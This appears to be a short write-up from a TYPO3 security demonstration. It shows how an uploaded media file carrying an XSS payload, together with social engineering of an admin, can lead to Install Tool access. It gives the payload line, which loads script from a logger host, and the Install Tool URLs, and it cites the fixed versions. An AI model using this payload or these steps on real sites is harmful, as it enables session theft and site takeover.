# Maybe get Install Tool Access

## Attack

**Preparation**

This is just one possible example how to use cross-site scripting.
In this case manual interaction by some more privileged user is required (e.g. through social engineering).

* upload `hack.youtube` to file-list module

```
"></iframe><script src="http://typo3v9-hack.ddev.local/logger/log.js"></script><iframe src="
```

* start the social engineering part, e.g. admin shall check file, because "it's not working"
* (admin user has to check file details, e.g. via file-list module, *info* popup)

**Attacker is backend user (but not admin, yet)**

`http://typo3v9-hack.ddev.local/typo3/install.php?install[controller]=maintenance&install[context]=backend`

**Attacker does not have backend user account**

Requires existing & valid `typo3conf/ENABLE_INSTALL_TOOL` file.

`http://typo3v9-hack.ddev.local/typo3/install.php`

## Security Vulnerability

* Media Asset handling fixed in https://review.typo3.org/#/c/59100/
  + TYPO3 affected until v7.6.31, v8.7.21, v9.5.1
* Install Tool HTTP-only cookie fixed in https://review.typo3.org/#/c/59103/
  + TYPO3 affected until v7.6.31, v8.7.21, v9.5.1